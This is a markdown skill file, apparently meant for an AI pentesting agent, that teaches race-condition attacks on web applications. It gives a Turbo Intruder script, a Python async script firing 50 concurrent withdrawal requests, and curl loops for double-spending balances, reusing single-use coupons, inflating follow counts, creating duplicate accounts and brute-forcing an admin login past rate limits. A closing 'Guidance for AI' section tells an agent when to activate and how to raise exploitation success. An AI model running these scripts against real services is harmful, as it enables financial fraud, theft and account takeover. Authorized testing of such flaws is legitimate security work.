# Race Condition Attacks Skill

## Goal

Exploit race condition vulnerabilities to bypass business logic, double-spend, or gain unauthorized access.

## Methodology

1. **Identify Time-Sensitive Operations:** Find operations with check-then-use patterns
2. **Analyze Request Flow:** Understand the sequence of database operations
3. **Set Up Parallel Requests:** Prepare multiple simultaneous requests
4. **Trigger Race Window:** Send requests concurrently to exploit timing gap
5. **Verify Exploitation:** Confirm the race condition was triggered

## Common Vulnerable Patterns

```
# Check-then-Use (TOCTOU)
1. Check balance >= withdrawal
2. Process withdrawal
3. Deduct from balance

# Between 1 and 3, race condition exists

# Coupon/Voucher Redemption
1. Check if coupon valid
2. Apply discount
3. Mark coupon as used
```

## Using Burp Suite Turbo Intruder

```python
# turbo_intruder_script.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=100,
                          pipeline=False)
    
    # Queue same request many times
    for i in range(30):
        engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

## Using Python Async

```python
import asyncio
import aiohttp

async def send_request(session, url, data):
    async with session.post(url, json=data) as response:
        return await response.text()

async def race_attack():
    url = "https://target.com/api/withdraw"
    data = {"amount": 100}
    
    async with aiohttp.ClientSession() as session:
        # Send 50 concurrent requests
        tasks = [send_request(session, url, data) for _ in range(50)]
        responses = await asyncio.gather(*tasks)
        return responses

asyncio.run(race_attack())
```

## Using GNU Parallel

```bash
# Create request file
echo "curl -X POST https://target.com/api/redeem -d 'code=DISCOUNT50'" > req.sh

# Send 100 concurrent requests
seq 100 | parallel -j100 bash req.sh
```

## Common Targets

### Money/Points Transfer
```bash
# Double-spend attack
# Balance: $100, try to withdraw $100 twice
curl -X POST target.com/withdraw -d "amount=100" &
curl -X POST target.com/withdraw -d "amount=100" &
# May result in -$100 balance
```

### Coupon Redemption
```bash
# Use single-use coupon multiple times
for i in {1..50}; do
  curl -X POST target.com/apply-coupon -d "code=SAVE50" &
done
wait
```

### Follow/Like Manipulation
```bash
# Increase counts beyond limits
for i in {1..100}; do
  curl -X POST target.com/follow -d "user=123" &
done
```

### Account Creation
```bash
# Create multiple accounts with same email
for i in {1..20}; do
  curl -X POST target.com/register -d "email=test@test.com&pass=abc$i" &
done
```

## Limit Overrun Attacks

```bash
# Bypass rate limiting via race
# Send requests faster than rate limit can update
for i in {1..1000}; do
  curl target.com/login -d "user=admin&pass=guess$i" &
done
```

## Single-Packet Attack (HTTP/2)

```python
# Send multiple requests in single TCP packet
# Arrives simultaneously, bypassing sequential rate limiting
# Use Burp Suite's HTTP/2 single-packet attack feature
```

## Tools

* **Burp Suite Turbo Intruder** - High-speed race condition testing
* **Race-the-Web** - Concurrent request testing
* **GNU Parallel** - Command-line parallelization

## Guidance for AI

* Activate when testing financial, inventory, or limit-based functionality
* Look for check-then-use patterns in business logic
* Database transactions should be atomic to prevent races
* HTTP/2 single-packet attacks are most effective
* Test coupon redemption, vote counting, inventory checkout
* Race conditions are often transient - may need multiple attempts
* Higher concurrency increases exploitation success rate
